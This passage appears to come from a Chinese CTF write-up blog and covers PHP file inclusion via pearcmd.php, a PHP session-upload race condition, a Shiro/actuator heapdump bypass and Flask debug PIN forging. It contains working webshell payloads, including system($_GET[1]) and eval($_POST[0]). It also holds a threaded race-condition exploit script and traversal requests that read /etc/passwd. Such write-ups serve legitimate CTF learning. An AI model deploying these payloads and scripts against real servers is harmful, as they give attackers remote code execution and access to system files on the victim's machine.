    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'jump.html'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token string">'view-jump.html.php'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$cfile</span> <span class="token operator">=</span> <span class="token constant">PATH_VIEWC</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$cfile</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">APP_DEBUG</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token function">filemtime</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$strs</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$viewfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$cfile</span><span class="token punctuation">,</span> <span class="token variable">$strs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$vars</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span> <span class="token variable">$cfile</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>$cfile可控</p>
<pre><code>?name=cfile&amp;value=/etc/passwd</code></pre>
<p><img src="/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/image-20211118164144041.png" alt="image-20211118164144041"></p>
<pre><code>?name=cfile&amp;+config-create+/&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=var_dump(system($_GET[1]));?&gt;+/tmp/a.php</code></pre>
<p><img src="/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/image-20211118164224693.png" alt="image-20211118164224693"></p>
<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls</code></pre>
<p><img src="/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/image-20211118164039627.png" alt="image-20211118164039627"></p>
<p>乱七八糟，查看根目录</p>
<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls%20/</code></pre>
<p><img src="/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/image-20211118164013390.png" alt="image-20211118164013390"></p>
<p>查看扥目录下的flag32897328937298hdwidh</p>
<pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=cat%20/flag32897328937298hdwidh</code></pre>
<p><img src="/2021/11/15/phpsec/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/tong-guo-hu-xiang-bei-2021-xue-xi-pearcmd.php-ying-yong/image-20211118163936469.png" alt="image-20211118163936469"></p>
<pre><code>?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/b.php+-d+man_dir=&lt;?@eval($_POST[0]);?&gt;+-s+ </code></pre>
<p>这还可以用到条件竞争：</p>
<p>参考：<a href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a></p>
<pre class=" language-Python"><code class="language-Python">import threading
import requests
from concurrent.futures import ThreadPoolExecutor, wait

target = 'http://192.168.1.162:8080/index.php'
session = requests.session()
flag = 'helloworld'


def upload(e: threading.Event):
    files = [
        ('file', ('load.png', b'a' * 40960, 'image/png')),
    ]
    data = {'PHP_SESSION_UPLOAD_PROGRESS': rf'''<?php file_put_contents('/tmp/success', '<?=`ls /`?>'); echo('{flag}'); ?>'''}

    while not e.is_set():
        requests.post(
            target,
            data=data,
            files=files,
            cookies={'PHPSESSID': flag},
        )


def write(e: threading.Event):
    while not e.is_set():
        response = requests.get(
            f'{target}?file=/tmp/sess_{flag}',
        )

        if flag.encode() in response.content:
            e.set()


if __name__ == '__main__':
    futures = []
    event = threading.Event()
    pool = ThreadPoolExecutor(15)
    for i in range(10):
        futures.append(pool.submit(upload, event))

    for i in range(5):
        futures.append(pool.submit(write, event))

    wait(futures)</code></pre>
<p>脚本执行完毕在目标中写入/tmp/success,里面为webshell：</p>
<h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>pom.xml里面有个shiro 1.5.0</p>
<p>扫描目录发现有/actuator文件</p>
<p>结合shiro鉴权绕过可以成功访问到</p>
<pre><code>/;/actuator/env</code></pre>
<pre><code>/;/actuator/heapdump</code></pre>
<p>找key的工具</p>
<pre><code>https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html</code></pre>
<p>还原：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> struct
str<span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span></code></pre>
<p>用shiro工具</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/meteox/article/details/121334507">https://blog.csdn.net/meteox/article/details/121334507</a></p>
<p><a href="https://ego00.blog.csdn.net/article/details/121323469">https://ego00.blog.csdn.net/article/details/121323469</a></p>
]]></content>
      <tags>
        <tag>PHPsec</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020：FlaskApp</title>
    <url>/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/</url>
    <content><![CDATA[<h1 id="Flask-debug-PIN命令执行漏洞"><a href="#Flask-debug-PIN命令执行漏洞" class="headerlink" title="Flask debug PIN命令执行漏洞"></a>Flask debug PIN命令执行漏洞</h1><p>在同一台机器上，多次重启Flask服务，PIN码值不改变，即PIN值固定。</p>
<p>Flask在生产环境中开启debug模式是一件非常危险的事，主要有3点原因：</p>
<p>1、会泄露当前报错页面的源码，可供审计挖掘其他漏洞</p>
<p>2、会泄露Web应用的绝对路径，及Python解释器的路径</p>
<p>3、debug页面中包含Python的交互式shell，可以执行任意Python代码</p>
<h2 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h2><pre><code>python39\Lib\site-packages\flask\aap.py
python39\Lib\site-packages\werkzeug\serving.py
python39\Lib\site-packages\werkzeug\debug\__init__.py</code></pre>
<p><code>debug\__init__.py</code>,<code>_get_pin</code>函数</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>str<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#hasattr() 函数用于判断对象是否包含对应的属性</span>
            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment" spellcheck="true"># type: ignore</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin</code></pre>
<p>跟进<code>get_pin_and_cookie_name</code>：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>str<span class="token punctuation">,</span> str<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>None<span class="token punctuation">,</span> None<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
    rv <span class="token operator">=</span> None
    num <span class="token operator">=</span> None

    <span class="token comment" spellcheck="true"># Pin was explicitly disabled</span>
    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> None<span class="token punctuation">,</span> None

    <span class="token comment" spellcheck="true"># Pin was provided explicitly</span>
    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># If there are separators in the pin, return it directly</span>
        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
            rv <span class="token operator">=</span> pin
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> pin

    modname <span class="token operator">=</span> getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>object<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#getattr() 函数用于返回一个对象属性值</span>
    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>str<span class="token punctuation">]</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># getuser imports the pwd module, which does not exist in Google</span>
        <span class="token comment" spellcheck="true"># App Engine. It may also raise a KeyError if the UID does not</span>
        <span class="token comment" spellcheck="true"># have a username, such as in Docker.</span>
        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> None

    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># This information only exists to make the cookie unique on the</span>
    <span class="token comment" spellcheck="true"># computer, not as a security feature.</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        username<span class="token punctuation">,</span>
        modname<span class="token punctuation">,</span>
        getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
        getattr<span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># This information is here to make it harder for an attacker to</span>
    <span class="token comment" spellcheck="true"># guess the cookie name.  They are unlikely to be contained anywhere</span>
    <span class="token comment" spellcheck="true"># within the unauthenticated debug page.</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> f<span class="token string">"__wzd{h.hexdigest()[:20]}"</span>

    <span class="token comment" spellcheck="true"># If we need to generate a pin we salt it a bit more so that we don't</span>
    <span class="token comment" spellcheck="true"># end up with the same value and generate out 9 digits</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> f<span class="token string">"{int(h.hexdigest(), 16):09d}"</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># Format the pincode in groups of digits for easier remembering if</span>
    <span class="token comment" spellcheck="true"># we don't have a result yet.</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name</code></pre>
<p>rv即PIN</p>
<p>主要代码为哈希：</p>
<pre class=" language-Python"><code class="language-Python">for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, text_type):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')</code></pre>
<p>其中的两个列表：</p>
<pre class=" language-python"><code class="language-python">probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    username<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#root当前用户，通过读取/etc/passwd获取</span>
    modname<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#flask.app一般情况为固定值</span>
    getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> getattr<span class="token punctuation">(</span>app<span class="token punctuation">.</span>__class__<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#Flask一般情况为固定值</span>
    getattr<span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">##flask目录下的一个app.py的绝对路径，通过debug错误页面获取</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取</span>
    get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#机器名，通过读取/proc/self/cgroup或/proc/sys/kernel/random/boot_id 或/etc/machine-id获取</span>
<span class="token punctuation">]</span></code></pre>
<p>get_machine_id()</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># Potential sources of secret information on linux.  The machine-id</span>
        <span class="token comment" spellcheck="true"># is stable across boots, the boot id is not</span>
        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">'/etc/machine-id'</span><span class="token punctuation">,</span> <span class="token string">'/proc/sys/kernel/random/boot_id'</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

        <span class="token comment" spellcheck="true"># On OS X we can use the computer's serial number assuming that</span>
        <span class="token comment" spellcheck="true"># ioreg exists and can spit out that information.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Also catch import errors: subprocess may not be available, e.g.</span>
            <span class="token comment" spellcheck="true"># Google App Engine</span>
            <span class="token comment" spellcheck="true"># See https://github.com/pallets/werkzeug/issues/925</span>
            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ioreg'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'IOPlatformExpertDevice'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                         stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>
            <span class="token keyword">if</span> match <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
                <span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token comment" spellcheck="true"># On Windows we can use winreg to get the machine guid</span>
        wr <span class="token operator">=</span> None
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">import</span> winreg <span class="token keyword">as</span> wr
        <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">import</span> _winreg <span class="token keyword">as</span> wr
            <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
        <span class="token keyword">if</span> wr <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> wr<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>wr<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
                                <span class="token string">'SOFTWARE\\Microsoft\\Cryptography'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                                wr<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> wr<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>
                    machineGuid<span class="token punctuation">,</span> wrType <span class="token operator">=</span> wr<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">'MachineGuid'</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>wrType <span class="token operator">==</span> wr<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> machineGuid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> machineGuid
            <span class="token keyword">except</span> WindowsError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

    _machine_id <span class="token operator">=</span> rv <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rv</code></pre>
<p>首先尝试读取<code>/etc/machine-id</code>或者 <code>/proc/sys/kernel/random/boot_i</code>中的值，若有就直接返回</p>
<p>假如是在win平台下读取不到上面两个文件，就去获取注册表中<code>SOFTWARE\\Microsoft\\Cryptography</code>的值，并返回</p>
<p>脚本见：“CISCN2018：final-TimeKeeper”</p>
<h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><ul>
<li>Windows 11</li>
<li>Python  3.9.6</li>
<li>Flask 2.0.1</li>
</ul>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><ol>
<li><p>下载flask：（我使用pycharm）</p>
</li>
<li><p>基于flask的web应用1.py</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Hello

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p>“return Hello”存在错误这里的hello未被定义，“debug=True”开启调试模式</p>
</li>
<li><p>部署到环境中</p>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145529828.png" alt="image-20211111145529828"></p>
<p>由于代码存在错误会进入debug</p>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145659650.png" alt="image-20211111145659650"></p>
<p>可以看到解释器和应用路径</p>
<p>console中输入pin</p>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150227938.png" alt="image-20211111150227938"></p>
<p>都未执行成功</p>
<p>后面的没能完成采用文章截图吧</p>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150209244.png" alt="image-20211111150209244"></p>
</li>
</ol>
<h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>在kali中跑出来了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> check_output

check_output<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111174707599.png" alt="image-20211111174707599"></p>
<h1 id="CISCN2018：final-TimeKeeper"><a href="#CISCN2018：final-TimeKeeper" class="headerlink" title="CISCN2018：final-TimeKeeper"></a>CISCN2018：final-TimeKeeper</h1><p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124738927.png" alt="image-20211111124738927"></p>
<p>发现/console</p>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124829534.png" alt="image-20211111124829534"></p>
<p>输错价格和id进入python debug</p>
<p><img src="/2021/11/11/pythonsec/flask-debug-pin-ming-ling-zhi-xing-lou-dong/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111125158901.png" alt="image-20211111125158901"></p>
<p>获取flask目录下的一个app.py的绝对路径</p>
<pre><code>/usr/local/lib/python2.7/dist-packages/flask/app.py</code></pre>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/etc/passwd</code></pre>
